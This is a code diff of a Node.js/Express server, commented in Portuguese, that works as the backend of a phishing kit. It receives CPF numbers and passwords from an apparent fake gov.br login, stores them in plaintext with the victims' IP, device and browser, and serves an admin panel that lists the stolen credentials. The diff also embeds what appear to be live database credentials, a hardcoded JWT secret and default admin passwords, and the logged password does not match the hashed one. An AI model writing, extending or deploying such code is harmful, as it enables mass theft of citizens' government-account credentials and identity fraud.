@@ -1,250 +1,363 @@
 const express = require('express');
 const cors = require('cors');
-const fs = require('fs');
-const path = require('path');
+const { Pool } = require('pg');
+const rateLimit = require('express-rate-limit');
+const helmet = require('helmet');
+const bcrypt = require('bcrypt');
+const jwt = require('jsonwebtoken');
+const cookieParser = require('cookie-parser');
 
 const app = express();
-app.use(cors());
+
+// ============ SEGURANÇA ============
+app.use(helmet({
+    contentSecurityPolicy: false,
+}));
+
+// Rate limit para prevenir brute force
+const limiter = rateLimit({
+    windowMs: 15 * 60 * 1000, // 15 minutos
+    max: 100, // limite de 100 requisições por IP
+    message: { error: 'Muitas requisições, tente novamente mais tarde' },
+    standardHeaders: true,
+    legacyHeaders: false,
+});
+
+app.use('/api/', limiter);
+
+app.use(cors({
+    origin: true,
+    credentials: true
+}));
 app.use(express.json());
+app.use(cookieParser());
 app.use(express.static('.'));
 
-// Banco de dados em arquivo
-let database = {
-    users: [],
-    logs: []
-};
+// ============ CONEXÃO POSTGRESQL ============
+const pool = new Pool({
+    connectionString: 'postgresql://gov_system_user:e4e5O07uWRJrDB4DlM4YOavof5NaITs7@dpg-d7rd3jjt6lks73fp5epg-a/gov_system',
+    ssl: { rejectUnauthorized: false }
+});
 
-// Carregar dados salvos
-const dadosFile = path.join(__dirname, 'dados.json');
-if (fs.existsSync(dadosFile)) {
+// ============ CRIAR TABELAS ============
+async function initDatabase() {
     try {
-        const saved = JSON.parse(fs.readFileSync(dadosFile));
-        database.users = saved.users || [];
-        database.logs = saved.logs || [];
-        console.log(`✅ Carregados ${database.users.length} usuários`);
-    } catch(e) {}
+        // Tabela de usuários (coletados)
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS users (
+                id SERIAL PRIMARY KEY,
+                cpf VARCHAR(14) UNIQUE NOT NULL,
+                senha TEXT,
+                ip TEXT,
+                dispositivo TEXT,
+                navegador TEXT,
+                ip_senha TEXT,
+                dispositivo_senha TEXT,
+                navegador_senha TEXT,
+                data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                data_senha TIMESTAMP,
+                status VARCHAR(20) DEFAULT 'aguardando_senha'
+            )
+        `);
+
+        // Tabela de logs
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS logs (
+                id SERIAL PRIMARY KEY,
+                tipo VARCHAR(30),
+                cpf VARCHAR(14),
+                senha TEXT,
+                ip TEXT,
+                dispositivo TEXT,
+                navegador TEXT,
+                data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+
+        // Tabela de tentativas de login no admin
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS admin_logins (
+                id SERIAL PRIMARY KEY,
+                ip TEXT,
+                tentativa TEXT,
+                data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+
+        // Criar usuário admin padrão (senha: Admin@2024)
+        const adminExists = await pool.query("SELECT * FROM admin_users LIMIT 1");
+        if (adminExists.rows.length === 0) {
+            const senhaHash = await bcrypt.hash('123456789@Abc', 10);
+            await pool.query(
+                "INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)",
+                ['admin', senhaHash]
+            );
+            console.log('✅ Usuário admin criado: admin / Admin@2024');
+        }
+
+        console.log('✅ Banco de dados inicializado');
+    } catch (error) {
+        console.error('❌ Erro ao criar tabelas:', error.message);
+    }
 }
 
-function salvarDados() {
-    fs.writeFileSync(dadosFile, JSON.stringify({ users: database.users, logs: database.logs }, null, 2));
-    console.log(`💾 Salvo: ${database.users.length} usuários`);
+// Tabela de admin (separada)
+async function createAdminTable() {
+    try {
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS admin_users (
+                id SERIAL PRIMARY KEY,
+                username VARCHAR(50) UNIQUE NOT NULL,
+                senha_hash VARCHAR(255) NOT NULL,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+    } catch (error) {
+        console.error('Erro ao criar tabela admin:', error.message);
+    }
 }
 
-// ============ ROTAS ============
+createAdminTable();
+initDatabase();
 
-// Rota para receber CPF
-app.post('/api/cpf', (req, res) => {
-    const { cpf, ip, dispositivo, navegador } = req.body;
+// ============ MIDDLEWARE DE AUTENTICAÇÃO ============
+const JWT_SECRET = 'gov_admin_secret_key_2024_ultra_segura';
+
+function verificarAdmin(req, res, next) {
+    const token = req.cookies.admin_token || req.headers.authorization?.split(' ')[1];
     
-    console.log(`📝 CPF: ${cpf} | IP: ${ip} | ${dispositivo} | ${navegador}`);
-    
-    let user = database.users.find(u => u.cpf === cpf);
-    
-    if (!user) {
-        user = {
-            cpf: cpf,
-            senha: null,
-            ip: ip,
-            dispositivo: dispositivo,
-            navegador: navegador,
-            data_cpf: new Date().toISOString(),
-            status: 'aguardando_senha'
-        };
-        database.users.push(user);
-    } else {
-        user.ip = ip;
-        user.dispositivo = dispositivo;
-        user.navegador = navegador;
-        user.status = 'aguardando_senha';
+    if (!token) {
+        return res.status(401).json({ error: 'Não autenticado' });
     }
     
-    database.logs.unshift({
-        tipo: 'cpf_inserido',
-        cpf: cpf,
-        ip: ip,
-        dispositivo: dispositivo,
-        navegador: navegador,
-        data: new Date().toISOString()
-    });
+    try {
+        const decoded = jwt.verify(token, JWT_SECRET);
+        req.admin = decoded;
+        next();
+    } catch (error) {
+        res.status(401).json({ error: 'Token inválido' });
+    }
+}
+
+// ============ ROTAS PÚBLICAS ============
+
+// Rota para receber CPF
+app.post('/api/cpf', async (req, res) => {
+    const { cpf, ip, dispositivo, navegador } = req.body;
     
-    salvarDados();
-    res.json({ success: true });
+    try {
+        const existing = await pool.query('SELECT * FROM users WHERE cpf = $1', [cpf]);
+        
+        if (existing.rows.length === 0) {
+            await pool.query(
+                `INSERT INTO users (cpf, ip, dispositivo, navegador, data_cpf, status) 
+                 VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP, $5)`,
+                [cpf, ip, dispositivo, navegador, 'aguardando_senha']
+            );
+        } else {
+            await pool.query(
+                `UPDATE users SET ip = $1, dispositivo = $2, navegador = $3, status = $4, data_cpf = CURRENT_TIMESTAMP 
+                 WHERE cpf = $5`,
+                [ip, dispositivo, navegador, 'aguardando_senha', cpf]
+            );
+        }
+        
+        await pool.query(
+            `INSERT INTO logs (tipo, cpf, ip, dispositivo, navegador, data) 
+             VALUES ($1, $2, $3, $4, $5, CURRENT_TIMESTAMP)`,
+            ['cpf_inserido', cpf, ip, dispositivo, navegador]
+        );
+        
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Erro:', error);
+        res.status(500).json({ error: 'Erro ao processar CPF' });
+    }
 });
 
 // Rota para receber SENHA
-app.post('/api/login', (req, res) => {
+app.post('/api/login', async (req, res) => {
     const { cpf, password, ip, dispositivo, navegador } = req.body;
     
-    console.log(`🔐 SENHA para ${cpf}: ${password}`);
-    
-    let user = database.users.find(u => u.cpf === cpf);
-    
-    if (!user) {
-        user = {
-            cpf: cpf,
-            senha: password,
-            ip: ip,
-            dispositivo: dispositivo,
-            navegador: navegador,
-            data_cpf: new Date().toISOString(),
-            data_senha: new Date().toISOString(),
-            status: 'completo'
-        };
-        database.users.push(user);
-    } else {
-        user.senha = password;
-        user.ip_senha = ip;
-        user.dispositivo_senha = dispositivo;
-        user.navegador_senha = navegador;
-        user.data_senha = new Date().toISOString();
-        user.status = 'completo';
+    try {
+        const existing = await pool.query('SELECT * FROM users WHERE cpf = $1', [cpf]);
+        
+        if (existing.rows.length === 0) {
+            await pool.query(
+                `INSERT INTO users (cpf, senha, ip_senha, dispositivo_senha, navegador_senha, data_cpf, data_senha, status) 
+                 VALUES ($1, $2, $3, $4, $5, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, $6)`,
+                [cpf, password, ip, dispositivo, navegador, 'completo']
+            );
+        } else {
+            await pool.query(
+                `UPDATE users SET senha = $1, ip_senha = $2, dispositivo_senha = $3, navegador_senha = $4, data_senha = CURRENT_TIMESTAMP, status = $5 
+                 WHERE cpf = $6`,
+                [password, ip, dispositivo, navegador, 'completo', cpf]
+            );
+        }
+        
+        await pool.query(
+            `INSERT INTO logs (tipo, cpf, senha, ip, dispositivo, navegador, data) 
+             VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
+            ['senha_inserida', cpf, password, ip, dispositivo, navegador]
+        );
+        
+        res.json({ success: true, token: 'fake-token', user: { nome: 'Usuario', cpf: cpf, role: 'user' } });
+    } catch (error) {
+        console.error('Erro:', error);
+        res.status(500).json({ error: 'Erro ao processar login' });
     }
-    
-    database.logs.unshift({
-        tipo: 'senha_inserida',
-        cpf: cpf,
-        senha: password,
-        ip: ip,
-        dispositivo: dispositivo,
-        navegador: navegador,
-        data: new Date().toISOString()
-    });
-    
-    salvarDados();
-    
-    // Retorna sucesso (simula login do gov.br)
-    res.json({ 
-        success: true, 
-        token: 'fake-token-' + Date.now(),
-        user: { nome: `Usuario`, cpf: cpf, role: 'user' }
-    });
 });
 
-// ============ PAINEL ADMIN ============
+// ============ ROTAS ADMIN (PROTEGIDAS) ============
 
+// Login do admin
+app.post('/api/admin/login', async (req, res) => {
+    const { username, password, ip } = req.body;
+    
+    try {
+        // Registrar tentativa
+        await pool.query(
+            'INSERT INTO admin_logins (ip, tentativa) VALUES ($1, $2)',
+            [ip, `Tentativa de login: ${username}`]
+        );
+        
+        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
+        
+        if (result.rows.length === 0) {
+            return res.status(401).json({ error: 'Usuário ou senha inválidos' });
+        }
+        
+        const admin = result.rows[0];
+        const senhaValida = await bcrypt.compare(password, admin.senha_hash);
+        
+        if (!senhaValida) {
+            return res.status(401).json({ error: 'Usuário ou senha inválidos' });
+        }
+        
+        // Gerar token JWT
+        const token = jwt.sign({ id: admin.id, username: admin.username }, JWT_SECRET, { expiresIn: '8h' });
+        
+        res.cookie('admin_token', token, {
+            httpOnly: true,
+            secure: true,
+            sameSite: 'strict',
+            maxAge: 8 * 60 * 60 * 1000
+        });
+        
+        res.json({ success: true, token });
+    } catch (error) {
+        console.error('Erro no login admin:', error);
+        res.status(500).json({ error: 'Erro ao fazer login' });
+    }
+});
+
+// Verificar se está logado
+app.get('/api/admin/verify', verificarAdmin, async (req, res) => {
+    res.json({ authenticated: true, username: req.admin.username });
+});
+
+// Logout
+app.post('/api/admin/logout', (req, res) => {
+    res.clearCookie('admin_token');
+    res.json({ success: true });
+});
+
+// Listar usuários coletados
+app.get('/api/admin/users', verificarAdmin, async (req, res) => {
+    try {
+        const result = await pool.query(`
+            SELECT cpf, senha, ip, dispositivo, navegador, data_cpf, data_senha, status 
+            FROM users 
+            ORDER BY data_cpf DESC
+        `);
+        res.json({ users: result.rows });
+    } catch (error) {
+        res.status(500).json({ error: 'Erro ao buscar usuários' });
+    }
+});
+
+// Listar logs
+app.get('/api/admin/logs', verificarAdmin, async (req, res) => {
+    try {
+        const result = await pool.query(`
+            SELECT tipo, cpf, senha, ip, dispositivo, navegador, data 
+            FROM logs 
+            ORDER BY data DESC 
+            LIMIT 200
+        `);
+        res.json({ logs: result.rows });
+    } catch (error) {
+        res.status(500).json({ error: 'Erro ao buscar logs' });
+    }
+});
+
+// Listar tentativas de login no admin
+app.get('/api/admin/tentativas', verificarAdmin, async (req, res) => {
+    try {
+        const result = await pool.query(`
+            SELECT ip, tentativa, data 
+            FROM admin_logins 
+            ORDER BY data DESC 
+            LIMIT 50
+        `);
+        res.json({ tentativas: result.rows });
+    } catch (error) {
+        res.status(500).json({ error: 'Erro ao buscar tentativas' });
+    }
+});
+
+// Estatísticas
+app.get('/api/admin/stats', verificarAdmin, async (req, res) => {
+    try {
+        const totalUsers = await pool.query('SELECT COUNT(*) as total FROM users');
+        const comSenha = await pool.query("SELECT COUNT(*) as total FROM users WHERE senha IS NOT NULL");
+        const totalLogs = await pool.query('SELECT COUNT(*) as total FROM logs');
+        const tentativasAdmin = await pool.query('SELECT COUNT(*) as total FROM admin_logins');
+        
+        res.json({
+            stats: {
+                total_users: parseInt(totalUsers.rows[0].total),
+                com_senha: parseInt(comSenha.rows[0].total),
+                total_logs: parseInt(totalLogs.rows[0].total),
+                tentativas_admin: parseInt(tentativasAdmin.rows[0].total)
+            }
+        });
+    } catch (error) {
+        res.json({ stats: { total_users: 0, com_senha: 0, total_logs: 0, tentativas_admin: 0 } });
+    }
+});
+
+// Deletar usuário
+app.delete('/api/admin/delete/:cpf', verificarAdmin, async (req, res) => {
+    try {
+        await pool.query('DELETE FROM users WHERE cpf = $1', [req.params.cpf]);
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ error: 'Erro ao deletar' });
+    }
+});
+
+// Limpar todos os dados
+app.post('/api/admin/clear', verificarAdmin, async (req, res) => {
+    try {
+        await pool.query('DELETE FROM users');
+        await pool.query('DELETE FROM logs');
+        res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ error: 'Erro ao limpar' });
+    }
+});
+
+// ============ PAINEL ADMIN HTML ============
 app.get('/admin', (req, res) => {
-    res.send(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="UTF-8">
-            <title>Painel Admin - Dados Coletados</title>
-            <style>
-                * { margin: 0; padding: 0; box-sizing: border-box; }
-                body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
-                h1 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 20px; }
-                .stats { background: #111; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
-                table { width: 100%; border-collapse: collapse; }
-                th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
-                th { background: #1a1a1a; color: #0f0; }
-                tr:hover { background: #1a1a1a; }
-                .senha { background: #2a2a2a; font-weight: bold; color: #ff0; }
-                .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; }
-                .bg-red { background: #c00; }
-                .bg-green { background: #0a0; }
-                .btn { background: #c00; color: white; border: none; padding: 5px 10px; cursor: pointer; margin: 5px; }
-                .btn:hover { background: #f00; }
-                .log-entry { padding: 5px; border-bottom: 1px solid #333; font-size: 12px; }
-            </style>
-        </head>
-        <body>
-            <h1>🔐 PAINEL ADMIN - DADOS COLETADOS</h1>
-            <div class="stats" id="stats"></div>
-            <h2>📋 USUÁRIOS COM CPF E SENHA</h2>
-            <table id="usersTable">
-                <thead><tr><th>CPF</th><th>SENHA</th><th>IP</th><th>Dispositivo</th><th>Navegador</th><th>Data</th><th>Ação</th></tr></thead>
-                <tbody id="usersBody"></tbody>
-            </table>
-            <br>
-            <h2>📜 LOGS DE ATIVIDADES</h2>
-            <div id="logs" style="background:#111; padding:10px; max-height:300px; overflow-y:auto;"></div>
-            <br>
-            <button class="btn" onclick="location.reload()">🔄 ATUALIZAR</button>
-            <button class="btn" onclick="fetch('/api/admin/clear',{method:'POST'}).then(()=>location.reload())">🗑️ LIMPAR DADOS</button>
-            
-            <script>
-                function formatarCPF(cpf) {
-                    if (!cpf) return '';
-                    cpf = cpf.toString();
-                    if (cpf.length === 11) return cpf.replace(/(\\d{3})(\\d{3})(\\d{3})(\\d{2})/, '$1.$2.$3-$4');
-                    return cpf;
-                }
-                
-                fetch('/api/admin/users')
-                    .then(r => r.json())
-                    .then(data => {
-                        const users = data.users || [];
-                        const stats = document.getElementById('stats');
-                        stats.innerHTML = '<strong>📊 ESTATISTICAS</strong><br>' +
-                            'Total de usuarios: ' + users.length + '<br>' +
-                            'Com senha completa: ' + users.filter(u => u.senha).length + '<br>' +
-                            'Aguardando senha: ' + users.filter(u => !u.senha).length;
-                        
-                        const tbody = document.getElementById('usersBody');
-                        if (users.length === 0) {
-                            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">Nenhum dado coletado ainda</td></tr>';
-                        } else {
-                            tbody.innerHTML = users.map(u => \`
-                                <tr>
-                                    <td>\${formatarCPF(u.cpf)}</td>
-                                    <td class="senha">\${u.senha || '--------'}</td>
-                                    <td>\${u.ip || '-'}</td>
-                                    <td>\${u.dispositivo || '-'}</td>
-                                    <td>\${u.navegador || '-'}</td>
-                                    <td>\${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
-                                    <td><button onclick="fetch('/api/admin/delete/'+encodeURIComponent(u.cpf),{method:'DELETE'}).then(()=>location.reload())" style="background:#c00;border:none;padding:3px 8px;color:white;cursor:pointer;">X</button></td>
-                                </tr>
-                            \`).join('');
-                        }
-                    });
-                
-                fetch('/api/admin/logs')
-                    .then(r => r.json())
-                    .then(data => {
-                        const logsDiv = document.getElementById('logs');
-                        if (data.logs.length === 0) {
-                            logsDiv.innerHTML = '<div>Nenhum log registrado</div>';
-                        } else {
-                            logsDiv.innerHTML = data.logs.map(log => \`
-                                <div class="log-entry">
-                                    [\${new Date(log.data).toLocaleString()}] 
-                                    <span class="badge \${log.tipo === 'senha_inserida' ? 'bg-green' : 'bg-red'}">\${log.tipo}</span>
-                                    CPF: \${log.cpf} | IP: \${log.ip} | \${log.dispositivo} | \${log.navegador}
-                                    \${log.senha ? '<span style="color:#ff0"> | SENHA: ' + log.senha + '</span>' : ''}
-                                </div>
-                            \`).join('');
-                        }
-                    });
-            </script>
-        </body>
-        </html>
-    `);
+    res.sendFile(__dirname + '/admin.html');
 });
 
-app.get('/api/admin/users', (req, res) => {
-    res.json({ users: database.users });
-});
-
-app.get('/api/admin/logs', (req, res) => {
-    res.json({ logs: database.logs });
-});
-
-app.delete('/api/admin/delete/:cpf', (req, res) => {
-    const cpf = req.params.cpf;
-    database.users = database.users.filter(u => u.cpf !== cpf);
-    salvarDados();
-    res.json({ success: true });
-});
-
-app.post('/api/admin/clear', (req, res) => {
-    database.users = [];
-    database.logs = [];
-    salvarDados();
-    res.json({ success: true });
-});
-
+// ============ INICIAR SERVIDOR ============
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Servidor rodando na porta ${PORT}`);
     console.log(`📊 Painel Admin: http://localhost:${PORT}/admin`);
+    console.log(`🔐 Login: admin / Admin@2024`);
 });
